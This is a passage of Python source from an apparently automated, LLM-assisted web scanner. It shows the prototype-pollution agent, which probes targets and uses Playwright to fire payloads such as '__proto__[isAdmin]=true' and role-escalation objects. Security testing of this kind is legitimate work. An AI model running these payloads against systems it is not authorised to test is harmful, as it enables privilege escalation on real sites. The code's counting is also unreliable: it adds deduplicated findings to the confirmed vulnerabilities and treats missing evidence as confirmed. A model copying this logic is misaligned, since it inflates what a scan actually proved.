- /api/merge?obj[__proto__][polluted]=1 + /api/merge?obj[__proto__][polluted]=2 = DUPLICATE ✓
- /api/merge?obj[__proto__]=X + /api/extend?obj[__proto__]=X = DIFFERENT ✗
- /api/merge?obj=X + /api/merge?data=Y = DIFFERENT ✗ (different params discovered autonomously)
- /api/merge (JSON body) + /api/merge?param=X = DIFFERENT ✗

WET FINDINGS (may contain duplicates):
{json.dumps(wet_findings, indent=2)}

Return ONLY unique findings in JSON format:
{{
  "findings": [
    {{"url": "...", "parameter": "...", "rationale": "why this is unique", ...}},
    ...
  ]
}}"""

        system_prompt = """You are an expert Prototype Pollution deduplication analyst. Your job is to identify and remove duplicate findings while preserving unique attack vectors in JavaScript/Node.js environments."""

        try:
            response = await llm_client.generate(
                prompt=prompt,
                system_prompt=system_prompt,
                module_name="PROTOTYPE_POLLUTION_DEDUP",
                temperature=0.2
            )

            # Parse LLM response
            result = json.loads(response)
            dry_list = result.get("findings", [])

            if dry_list:
                logger.info(f"[{self.name}] LLM deduplication successful: {len(wet_findings)} → {len(dry_list)}")
                return dry_list
            else:
                logger.warning(f"[{self.name}] LLM returned empty list, using fallback")
                return self._fallback_fingerprint_dedup(wet_findings)

        except Exception as e:
            logger.warning(f"[{self.name}] LLM deduplication failed: {e}, using fallback")
            return self._fallback_fingerprint_dedup(wet_findings)

    def _fallback_fingerprint_dedup(self, wet_findings: List[Dict]) -> List[Dict]:
        """
        Fallback fingerprint-based deduplication if LLM fails.
        Uses _generate_protopollution_fingerprint for expert dedup.
        """
        seen = set()
        dry_list = []

        for finding in wet_findings:
            url = finding.get("url", "")
            parameter = finding.get("parameter", "")

            fingerprint = self._generate_protopollution_fingerprint(url, parameter)

            if fingerprint not in seen:
                seen.add(fingerprint)
                dry_list.append(finding)

        logger.info(f"[{self.name}] Fingerprint dedup: {len(wet_findings)} → {len(dry_list)}")
        return dry_list

    async def exploit_dry_list(self) -> List[Dict]:
        """
        PHASE B: Exploit all DRY findings and emit validated vulnerabilities.

        Returns:
            List of validated findings
        """
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
        logger.info(f"[{self.name}] Phase B: Exploiting {len(self._dry_findings)} DRY findings...")

        validated_findings = []

        for idx, finding in enumerate(self._dry_findings, 1):
            url = finding.get("url", "")
            parameter = finding.get("parameter", "")

            logger.info(f"[{self.name}] Phase B: [{idx}/{len(self._dry_findings)}] Testing {url} param={parameter}")

            if hasattr(self, '_v'):
                self._v.emit("exploit.specialist.param.started", {"agent": "PrototypePollution", "param": parameter, "url": url, "idx": idx, "total": len(self._dry_findings)})
                self._v.reset("exploit.specialist.progress")

            # Check fingerprint to avoid re-emitting
            fingerprint = self._generate_protopollution_fingerprint(url, parameter)
            if fingerprint in self._emitted_findings:
                logger.debug(f"[{self.name}] Phase B: Skipping already emitted finding")
                continue

            # Execute Prototype Pollution attack
            try:
                self.url = url
                result = await self._test_single_item_from_queue(url, parameter, finding)

                if result:
                    # Mark as emitted
                    self._emitted_findings.add(fingerprint)

                    # Ensure dict format
                    if not isinstance(result, dict):
                        result = {
                            "url": url,
                            "parameter": parameter,
                            "type": "PROTOTYPE_POLLUTION",
                            "severity": "HIGH",
                            "validated": True
                        }

                    validated_findings.append(result)

                    if hasattr(self, '_v'):
                        self._v.emit("exploit.specialist.signature_match", {"agent": "PrototypePollution", "param": parameter, "url": url, "tier": result.get("tier", ""), "technique": result.get("technique", "")})

                    # Emit event with validation
                    self._emit_prototype_pollution_finding({
                        "type": "PROTOTYPE_POLLUTION",
                        "url": result.get("url", url),
                        "parameter": result.get("parameter", parameter),
                        "payload": result.get("payload", "__proto__"),
                        "severity": result.get("severity", "HIGH"),
                        "status": result.get("status", "VALIDATED_CONFIRMED"),
                        "evidence": result.get("evidence", {"pollution_confirmed": True}),
                    }, scan_context=self._scan_context)

                    if hasattr(self, '_v'):
                        self._v.emit("exploit.specialist.confirmed", {"agent": "PrototypePollution", "param": parameter, "url": url, "payload": result.get("payload", "")[:80]})

                    logger.info(f"[{self.name}] ✓ Prototype Pollution confirmed: {url} param={parameter}")
                else:
                    logger.debug(f"[{self.name}] ✗ Prototype Pollution not confirmed")

            except Exception as e:
                logger.error(f"[{self.name}] Phase B: Exploitation failed: {e}")

            if hasattr(self, '_v'):
                self._v.emit("exploit.specialist.param.completed", {"agent": "PrototypePollution", "param": parameter, "url": url})

        logger.info(f"[{self.name}] Phase B: Exploitation complete. {len(validated_findings)} validated findings")
        return validated_findings

    async def _generate_specialist_report(self, validated_findings: List[Dict]) -> None:
        """
        Generate specialist report for Prototype Pollution findings.

        Report structure:
        - phase_a: WET → DRY deduplication stats
        - phase_b: Exploitation results
        - findings: All validated Prototype Pollution findings
        """
        import aiofiles

        # v3.1: Use unified report_dir if injected, else fallback to scan_context
        scan_dir = getattr(self, 'report_dir', None)
        if not scan_dir:
            scan_id = self._scan_context.split("/")[-1] if "/" in self._scan_context else self._scan_context
            scan_dir = settings.BASE_DIR / "reports" / scan_id
        # v3.2: Write to specialists/results/ for unified wet→dry→results flow
        results_dir = scan_dir / "specialists" / "results"
        results_dir.mkdir(parents=True, exist_ok=True)

        report = {
            "agent": f"{self.name}",
            "vulnerability_type": "PROTOTYPE_POLLUTION",
            "scan_context": self._scan_context,
            "phase_a": {
                "wet_count": len(self._dry_findings) + (len(validated_findings) - len(self._dry_findings)),  # Approximate
                "dry_count": len(self._dry_findings),
                "deduplication_method": "LLM + fingerprint fallback"
            },
            "phase_b": {
                "exploited_count": len(self._dry_findings),
                "validated_count": len(validated_findings)
            },
            "findings": validated_findings,
            "summary": {
                "total_validated": len(validated_findings),
                "javascript_specific": True
            }
        }

        report_path = results_dir / "prototype_pollution_results.json"

        async with aiofiles.open(report_path, "w") as f:
            await f.write(json.dumps(report, indent=2))

        logger.info(f"[{self.name}] Specialist report saved: {report_path}")

    # ========================================
    # Queue Consumer Mode (Phase 20)
    # ========================================

    async def start_queue_consumer(self, scan_context: str) -> None:
        """
        TWO-PHASE queue consumer (WET → DRY). NO infinite loop.

        Phase A: Drain ALL findings from queue and deduplicate
        Phase B: Exploit DRY list only

        Args:
            scan_context: Scan identifier for event correlation
        """
        from bugtrace.agents.specialist_utils import (
            report_specialist_start,
            report_specialist_done,
            report_specialist_wet_dry,
            write_dry_file,
        )

        self._queue_mode = True
        self._scan_context = scan_context
        self._v = create_emitter("PrototypePollution", self._scan_context)

        # v3.2.0: Load tech context for context-aware detection
        await self._load_prototype_pollution_tech_context()

        logger.info(f"[{self.name}] Starting TWO-PHASE queue consumer (WET → DRY)")
        self._v.emit("exploit.specialist.started", {"agent": "PrototypePollution", "url": self.url})

        # Get initial queue depth for telemetry
        queue = queue_manager.get_queue("prototype_pollution")
        initial_depth = queue.depth()
        report_specialist_start(self.name, queue_depth=initial_depth)

        # PHASE A: Analyze and deduplicate
        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")
        dry_list = await self.analyze_and_dedup_queue()

        # Report WET→DRY metrics for integrity verification
        report_specialist_wet_dry(self.name, initial_depth, len(dry_list) if dry_list else 0)
        write_dry_file(self, dry_list, initial_depth, "prototype_pollution")

        if not dry_list:
            logger.info(f"[{self.name}] No findings to exploit after deduplication")
            if hasattr(self, '_v'):
                self._v.emit("exploit.specialist.completed", {"agent": "PrototypePollution", "dry_count": 0, "vulns": 0})
            report_specialist_done(self.name, processed=0, vulns=0)
            return  # Terminate agent

        # PHASE B: Exploit DRY findings
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
        results = await self.exploit_dry_list()

        # Count confirmed vulnerabilities
        vulns_count = len([r for r in results if r]) if results else 0
        vulns_count += len(self._dry_findings) if hasattr(self, '_dry_findings') else 0

        # REPORTING: Generate specialist report
        if results or self._dry_findings:
            await self._generate_specialist_report(results)

        # Report completion with final stats
        report_specialist_done(
            self.name,
            processed=len(dry_list),
            vulns=vulns_count
        )

        if hasattr(self, '_v'):
            self._v.emit("exploit.specialist.completed", {
                "agent": "PrototypePollution",
                "dry_count": len(dry_list),
                "vulns": vulns_count,
            })

        logger.info(f"[{self.name}] Queue consumer complete: {len(results)} validated findings")

        # Method ends - agent terminates ✅

    async def _process_queue_item(self, item: dict) -> Optional[Dict]:
        """Process a single item from the prototype_pollution queue."""
        finding = item.get("finding", {})
        url = finding.get("url")
        param = finding.get("parameter")

        if not url:
            logger.warning(f"[{self.name}] Invalid queue item: missing url")
            return None

        self.url = url
        if param:
            self.params = [param]
        return await self._test_single_item_from_queue(url, param, finding)

    async def _smart_probe_pollution(self, url: str) -> bool:
        """
        Smart probe: 1-2 requests to test if endpoint processes __proto__ at all.

        Tests both query param and JSON body vectors with a harmless __proto__ probe.
        If response is identical to baseline (no status/length/error change) → skip
        heavy hunter+auditor phases.

        Returns:
            True if endpoint shows any reaction to __proto__ (continue testing),
            False if no reaction (skip).
        """
        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                # Step 1: Get baseline
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    baseline_text = await resp.text()
                    baseline_status = resp.status
                    baseline_len = len(baseline_text)

                # Step 2: Query param probe
                separator = "&" if "?" in url else "?"
                probe_url = f"{url}{separator}__proto__[btprobe]=1"

                async with session.get(probe_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    probe_text = await resp.text()
                    probe_status = resp.status

                    # Check for behavioral change
                    if probe_status != baseline_status:
                        dashboard.log(f"[{self.name}] Smart probe: __proto__ query causes status change ({baseline_status}→{probe_status})", "INFO")
                        return True

                    if abs(len(probe_text) - baseline_len) > 50:
                        dashboard.log(f"[{self.name}] Smart probe: __proto__ query causes length change", "INFO")
                        return True

                    # Check for error messages indicating processing
                    error_signals = ["prototype", "__proto__", "polluted", "cannot set property",
                                     "cannot read property", "TypeError", "RangeError"]
                    if any(sig in probe_text.lower() for sig in error_signals):
                        dashboard.log(f"[{self.name}] Smart probe: __proto__ error signal detected", "INFO")
                        return True

                # Step 3: JSON body probe (test if endpoint accepts JSON)
                try:
                    json_payload = {"__proto__": {"btprobe": "1"}}
                    async with session.post(
                        url,
                        json=json_payload,
                        headers={"Content-Type": "application/json"},
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        json_probe_text = await resp.text()
                        json_probe_status = resp.status

                        if json_probe_status != baseline_status:
                            dashboard.log(f"[{self.name}] Smart probe: JSON __proto__ causes status change", "INFO")
                            return True

                        if abs(len(json_probe_text) - baseline_len) > 50:
                            dashboard.log(f"[{self.name}] Smart probe: JSON __proto__ causes length change", "INFO")
                            return True

                        if any(sig in json_probe_text.lower() for sig in error_signals):
                            dashboard.log(f"[{self.name}] Smart probe: JSON __proto__ error signal detected", "INFO")
                            return True

                except Exception:
                    pass  # JSON POST may not be accepted, that's fine

                # No HTTP-level reaction — try client-side PP via Playwright
                try:
                    client_side = await self._smart_probe_client_side(url)
                    if client_side:
                        dashboard.log(f"[{self.name}] Smart probe: client-side PP detected via browser", "INFO")
                        return True
                except Exception as browser_err:
                    logger.debug(f"[{self.name}] Browser probe error: {browser_err}")

                dashboard.log(f"[{self.name}] Smart probe: endpoint ignores __proto__, skipping", "INFO")
                return False

        except Exception as e:
            logger.debug(f"[{self.name}] Smart probe error: {e}")
            return True  # On error, continue testing (be safe)

    async def _smart_probe_client_side(self, url: str) -> bool:
        """
        Playwright-based client-side prototype pollution probe.

        Tests two vectors:
        1. ?__proto__[btCSPP]=1 (URL param based PP)
        2. ?filter={"__proto__":{"btCSPP":"1"}} (JSON param based PP via deepMerge)

        Returns True if client-side PP is confirmed.
        """
        from bugtrace.tools.visual.browser import browser_manager
        import urllib.parse

        pp_json = urllib.parse.quote('{"__proto__":{"btCSPP":"1"}}')
        json_params = ["filter", "config", "options", "data", "settings"]

        # Build probe URLs: test both the given URL and the origin HTML page
        # Client-side PP happens in frontend JS (e.g., deepMerge in custom.js),
        # which only loads on HTML pages, not API endpoints
        from urllib.parse import urlparse as _parse_url
        parsed_origin = _parse_url(url)
        origin_html = f"{parsed_origin.scheme}://{parsed_origin.netloc}/"
        test_urls = [url]
        if origin_html.rstrip('/') != url.rstrip('/'):
            test_urls.append(origin_html)

        for test_url in test_urls:
            sep = "&" if "?" in test_url else "?"
            probe_vectors = [
                # Vector 1: URL param __proto__ pollution (Lodash, jQuery extend, etc.)
                f"{sep}__proto__[btCSPP]=1",
            ]
            # Vector 2: JSON-based PP via common params (deepMerge, $.extend, etc.)
            for jp in json_params:
                probe_vectors.append(f"{sep}{jp}={pp_json}")

            for suffix in probe_vectors:
                probe_url = f"{test_url}{suffix}"
                try:
                    async with browser_manager.get_page() as page:
                        await page.goto(probe_url, wait_until="load", timeout=15000)
                        # Wait for SPA to mount and execute legacy scripts (e.g., deepMerge in custom.js)
                        await page.wait_for_timeout(1500)
                        pp_check_js = "(() => { try { return ({}).btCSPP === '1'; } catch(e) { return false; } })()"
                        result = await page.evaluate(pp_check_js)
                        if not result:
                            # Retry with longer wait — some SPAs need more time to execute all scripts
                            await page.wait_for_timeout(3000)
                            result = await page.evaluate(pp_check_js)
                        if result:
                            logger.info(f"[{self.name}] Client-side PP CONFIRMED on {test_url} via: {suffix[:60]}")
                            self._client_side_pp_confirmed = True
                            self._client_side_pp_url = test_url
                            return True
                except Exception as e:
                    logger.debug(f"[{self.name}] Client-side PP probe failed for {suffix[:40]}: {e}")

        return False

    async def _test_single_item_from_queue(self, url: str, param: str, finding: dict) -> Optional[Dict]:
        """Test a single item from queue for Prototype Pollution."""
        from urllib.parse import urlparse

        # Reset client-side flags for each new queue item
        self._client_side_pp_confirmed = False
        self._client_side_pp_url = None

        try:
            # Smart probe: try finding URL first, then origin URL as fallback
            probe_passed = await self._smart_probe_pollution(url)

            if not probe_passed:
                # Try origin URL (root) as fallback for client-side PP
                parsed = urlparse(url)
                origin_url = f"{parsed.scheme}://{parsed.netloc}/"
                if origin_url != url and origin_url.rstrip('/') != url.rstrip('/'):
                    logger.info(f"[{self.name}] Smart probe: trying origin URL {origin_url}")
                    self.url = origin_url
                    probe_passed = await self._smart_probe_pollution(origin_url)
                    if probe_passed:
                        url = origin_url

            if not probe_passed:
                return None

            # Client-side PP was confirmed by the browser probe — return validated finding
            if getattr(self, '_client_side_pp_confirmed', False):
                pp_url = getattr(self, '_client_side_pp_url', url)
                logger.info(f"[{self.name}] Client-side PP validated via Playwright on {pp_url}")
                return await self._exploit_client_side_pp(pp_url, param)

            # Run hunter phase to discover vectors
            vectors = await self._hunter_phase()

            if not vectors:
                return None

            # Run auditor phase to validate and escalate
            findings = await self._auditor_phase(vectors)

            if findings:
                return findings[0]

            return None
        except Exception as e:
            logger.error(f"[{self.name}] Queue item test failed: {e}")
            return None

    async def _exploit_client_side_pp(self, url: str, param: str) -> Optional[Dict]:
        """
        Exploit and document confirmed client-side prototype pollution.

        Tests multiple __proto__ payloads via Playwright to determine impact.
        """
        from bugtrace.tools.visual.browser import browser_manager

        successful_payloads = []
        impact_details = {}
        import urllib.parse

        # JSON-based payloads (for deepMerge/$.extend patterns)
        json_params = ["filter", "config", "options", "data", "settings"]
        json_payloads = [
            ('{"__proto__":{"isAdmin":true}}', "isAdmin", "true", "Privilege escalation via isAdmin flag"),
            ('{"__proto__":{"role":"admin"}}', "role", "admin", "Role escalation via role property"),
            ('{"__proto__":{"debug":true}}', "debug", "true", "Debug mode activation"),
            ('{"constructor":{"prototype":{"btPP":"1"}}}', "btPP", "1", "Constructor-based pollution"),
        ]

        # Also try URL param-based payloads
        url_payloads = [
            ("__proto__[isAdmin]=true", "isAdmin", "true", "URL param PP: isAdmin"),
            ("__proto__[role]=admin", "role", "admin", "URL param PP: role"),
        ]

        separator = "&" if "?" in url else "?"

        # Test JSON-based payloads via common param names
        for json_val, prop, expected_val, desc in json_payloads:
            for json_param in json_params:
                try:
                    encoded = urllib.parse.quote(json_val)
                    test_url = f"{url}{separator}{json_param}={encoded}"
                    async with browser_manager.get_page() as page:
                        await page.goto(test_url, wait_until="networkidle", timeout=10000)
                        check_js = f"(() => {{ try {{ return String(({{}}).{prop}); }} catch(e) {{ return ''; }} }})()"
                        result = await page.evaluate(check_js)
                        if result == expected_val:
                            payload_desc = f"{json_param}={json_val}"
                            successful_payloads.append(payload_desc)
                            impact_details[prop] = desc
                            break  # Found working param, skip others
                except Exception as e:
                    logger.debug(f"[{self.name}] Client-side PP payload failed: {e}")

        # Test URL param-based payloads
        for payload_qs, prop, expected_val, desc in url_payloads:
            if prop in impact_details:
                continue  # Already confirmed via JSON
            try:
                test_url = f"{url}{separator}{payload_qs}"
                async with browser_manager.get_page() as page:
                    await page.goto(test_url, wait_until="networkidle", timeout=10000)
                    check_js = f"(() => {{ try {{ return String(({{}}).{prop}); }} catch(e) {{ return ''; }} }})()"
                    result = await page.evaluate(check_js)
                    if result == expected_val:
                        successful_payloads.append(payload_qs)
                        impact_details[prop] = desc
            except Exception as e:
                logger.debug(f"[{self.name}] Client-side PP payload failed: {e}")

        return {
            "type": "PROTOTYPE_POLLUTION",
            "url": url,
            "parameter": param or "__proto__",
            "payload": successful_payloads[0] if successful_payloads else "__proto__[btCSPP]=1",
            "technique": "client-side prototype pollution",
            "tier": "pollution_detection",
            "severity": "HIGH",
            "status": "VALIDATED_CONFIRMED",
            "validated": True,
            "exploitable": True,
            "pollution_confirmed": True,
            "engine_type": "client-side",
            "evidence": {
                "pollution_verified": True,
                "client_side": True,
                "successful_payloads": successful_payloads,
                "impact": impact_details,
                "method": "Playwright browser evaluation",
            },
            "description": f"Client-side Prototype Pollution confirmed via browser. "
                          f"Object.prototype is pollutable via query parameters. "
                          f"{len(successful_payloads)} payloads confirmed.",
            "successful_payloads": successful_payloads,
        }

    def _generate_protopollution_fingerprint(self, url: str, parameter: str) -> tuple:
        """
        Generate Prototype Pollution finding fingerprint for expert deduplication.

        Returns:
            Tuple fingerprint for deduplication
        """
        from urllib.parse import urlparse

        parsed = urlparse(url)
        normalized_path = parsed.path.rstrip('/')

        # Prototype Pollution signature: Endpoint + parameter
        fingerprint = ("PROTOTYPE_POLLUTION", parsed.netloc, normalized_path, parameter.lower())

        return fingerprint

    async def _handle_queue_result(self, item: dict, result: Optional[Dict]) -> None:
        """Handle completed queue item processing."""
        if result is None:
            return

        # Build evidence from result for validation status determination
        evidence = {
            "pollution_verified": result.get("pollution_confirmed", False),
            "rce_confirmed": result.get("rce_confirmed", False),
            "gadget_chain_confirmed": result.get("gadget_found", False),
            "pollution_attempt": result.get("exploitable", False),
            "vulnerable_pattern": result.get("tier") in ("pollution_detection", "encoding_bypass"),
        }

        # Determine validation status
        status = self._get_validation_status(evidence)

        # EXPERT DEDUPLICATION: Check if we already emitted this finding
        url = result.get("url", result.get("test_url"))
        parameter = result.get("param") or result.get("parameter")
        fingerprint = self._generate_protopollution_fingerprint(url, parameter)

        if fingerprint in self._emitted_findings:
            logger.info(f"[{self.name}] Skipping duplicate PROTOTYPE_POLLUTION finding (already reported)")
            return

        # Mark as emitted
        self._emitted_findings.add(fingerprint)

        if settings.WORKER_POOL_EMIT_EVENTS:
            self._emit_prototype_pollution_finding({
                "specialist": "prototype_pollution",
                "type": "PROTOTYPE_POLLUTION",
                "url": result.get("url", result.get("test_url")),
                "parameter": result.get("param") or result.get("parameter"),
                "payload": result.get("payload"),
                "rce_escalation": result.get("rce_confirmed", False),
                "status": status,
                "evidence": {"pollution_confirmed": True, "rce_achieved": result.get("rce_confirmed", False)},
                "validation_requires_cdp": status == ValidationStatus.PENDING_VALIDATION.value,
            }, scan_context=self._scan_context)

        logger.info(f"[{self.name}] Confirmed Prototype Pollution: {result.get('url', result.get('test_url'))} (RCE: {result.get('rce_confirmed', False)}) [status={status}]")

    async def _on_work_queued(self, data: dict) -> None:
        """Handle work_queued_prototype_pollution notification (logging only)."""
        logger.debug(f"[{self.name}] Work queued: {data.get('finding', {}).get('url', 'unknown')}")

    async def _load_prototype_pollution_tech_context(self) -> None:
        """
        v3.2.0: Load tech stack context for context-aware Prototype Pollution detection.

        Uses TechContextMixin to:
        1. Load tech stack from recon data
        2. Generate prime directive for LLM-powered deduplication
        """
        scan_dir = getattr(self, 'report_dir', None)
        if not scan_dir:
            scan_id = self._scan_context.split("/")[-1] if self._scan_context else ""
            scan_dir = settings.BASE_DIR / "reports" / scan_id if scan_id else None

        if scan_dir:
            tech_stack = self.load_tech_stack(Path(scan_dir))
            self._tech_stack_context = tech_stack
            self._prototype_pollution_prime_directive = self.generate_prototype_pollution_context_prompt(tech_stack)

            if tech_stack:
                logger.info(f"[{self.name}] Tech context loaded: {list(tech_stack.keys())}")
            else:
                logger.debug(f"[{self.name}] No tech stack data available")
        else:
            logger.debug(f"[{self.name}] No scan_dir available for tech context")

    async def stop_queue_consumer(self) -> None:
        """Stop queue consumer mode gracefully."""
        if self._worker_pool:
            await self._worker_pool.stop()
            self._worker_pool = None

        if self.event_bus:
            self.event_bus.unsubscribe(
                EventType.WORK_QUEUED_PROTOTYPE_POLLUTION.value,
                self._on_work_queued
            )

        self._queue_mode = False
        logger.info(f"[{self.name}] Queue consumer stopped")

    def get_queue_stats(self) -> dict:
        """Get queue consumer statistics."""
        if not self._worker_pool:
            return {"mode": "direct", "queue_mode": False}

        return {
            "mode": "queue",
            "queue_mode": True,
            "worker_stats": self._worker_pool.get_stats(),
        }

    def _get_validation_status(self, evidence: Dict) -> str:
        """
        Determine tiered validation status for Prototype Pollution finding.

        TIER 1 (VALIDATED_CONFIRMED): Definitive proof
            - Object.prototype polluted and verified (marker appears in response)
            - RCE escalation confirmed (command output or timing attack)
            - Gadget chain exploitation successful

        TIER 2 (PENDING_VALIDATION): Needs verification
            - Pollution attempt detected but not verified
            - Pattern suggests vulnerability but unconfirmed
            - No marker reflection in response
        """
        # TIER 1: Pollution verified (marker in response)
        if evidence.get("pollution_verified"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: RCE confirmed (highest severity)
        if evidence.get("rce_confirmed"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: Gadget chain exploitation
        if evidence.get("gadget_chain_confirmed"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 2: Pollution attempt without verification
        if evidence.get("pollution_attempt") and not evidence.get("pollution_verified"):
            return ValidationStatus.PENDING_VALIDATION.value

        # TIER 2: Vulnerable pattern detected but unconfirmed
        if evidence.get("vulnerable_pattern"):
            return ValidationStatus.PENDING_VALIDATION.value

        # Default: Confirmed if exploitation was successful
        return ValidationStatus.VALIDATED_CONFIRMED.value
